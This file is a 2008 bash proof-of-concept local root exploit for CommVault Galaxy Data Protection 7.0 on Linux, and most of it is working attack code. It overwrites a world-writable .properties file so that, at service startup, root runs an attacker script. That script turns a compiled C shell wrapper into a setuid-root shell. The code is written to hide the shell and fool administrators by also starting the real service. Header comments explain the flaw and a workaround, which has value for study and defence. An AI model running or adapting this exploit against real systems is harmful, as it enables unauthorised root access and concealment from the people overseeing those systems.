#!/bin/bash
#
# commvaultproperties.sh by cenobyte 13/08/2008
#
# CommVault Galaxy Data Protection 7.0 local Linux root POC exploit
#
# On the default Linux installation of CommVault Galaxy there are
# lots of files with insecure permissions.
# The /etc/CommVaultRegistry/Galaxy/Instance001/Services/.properties file
# defines the location of the Qinetix Service binaries and is world writable.
# An attacker can replace the location of /opt/galaxy/Base/cvd with an
# arbritary command which is executed as root during CommVault startup.
#
# This vulnerability was discovered in version 7.0.0 Build76 on RHEL4u5 x86_64
# It is unknown if (older) versions and/or other UNIX platforms are also
# vulnerable.
#
# Vulnerability workaround: 
# Removing the write permissions for 'others' on the .properties files does
# not solve the issue as CommVault alters PID numbers in .properties by
# utilizing a temporary file with 'O_WRONLY|O_CREAT|O_TRUNC, 0666' parameters.
# The temporary file is then moved to .profile thus undoing the read only
# permissions.
# One should write a wrapper around the [S|K]99Galaxy scripts that take care
# of setting proper file permissions on .properties (I did not test this
# workaround).
#
# Risk:
# Moderate; an administrator needs to restart CommVault for the exploit to
# succesfully finish.
#
# Exploit dependencies:
# This POC exploit relies on gcc and the absence of /opt nosuid and noexec
# flags in /etc/fstab. I chose to use /opt/galaxy/PF as a temporary directory
# and location for the setuid root shell to hide it from system administrators
# that usually snoop around in /tmp.

properties="/etc/CommVaultRegistry/Galaxy/Instance001/Services/.properties"
pf="/opt/galaxy/PF"
gcc="/usr/bin/gcc"

if [ ! -f $properties ]; then
	echo "error: $properties does not exist"
	exit 1
fi

for x in $properties $pf; do
	if [ ! -w $x ]; then
		echo "error: $x is not writable"
		exit 1
	fi
done

if [ ! -x $gcc ]; then
	echo "error: cannot execute $gcc"
	exit 1
fi

/bin/grep -q "$pf/cvd" $properties
if [ $? -eq 0 ]; then
	echo "Be patient!"
	exit 1
fi

echo -e "[-] CommVault Galaxy Data Protection 7.0 local Linux root exploit\n"
echo "[*] creating shell wrapper"
/bin/cat > $pf/shell.c << _END_
#include <unistd.h>

int
main()
{
	setuid(0);
	setgid(0);

	execl("/bin/sh", "/bin/sh", NULL);

	/* never reached */
	return(0);
}
_END_

echo "[*] compiling shell wrapper"
$gcc $pf/shell.c -o $pf/shell 2> /dev/null
if [ $? -ne 0 ]; then
	echo "error: gcc failed"

	# cleaning up
	/bin/rm -f $pf/shell.c
	exit 1
fi

echo "[*] replacing cvd entries"
grep -Ev "argv0_0|path0" $properties > $pf/p.$$

/bin/cat >> $pf/p.$$ << _END_
argv0_0 $pf/cvd
path0 $pf/cvd
_END_

/bin/cat $pf/p.$$ > $properties

# After the setuid shell also start cvd to make it look like everything is okay
# to fool system administrators.
echo "[*] inserting shell wrapper setuid commands"
/bin/cat >> $pf/cvd << _END_
#!/bin/bash
/bin/chown root:root $pf/shell
/bin/chmod +s $pf/shell
/opt/galaxy/Base/cvd
_END_

/bin/chmod +x $pf/cvd

# Cleaning up
/bin/rm -f $pf/p.$$ $pf/shell.c

echo -e "[*] done\n"
echo "Now wait for CommVault to be (re)started"

exit 0
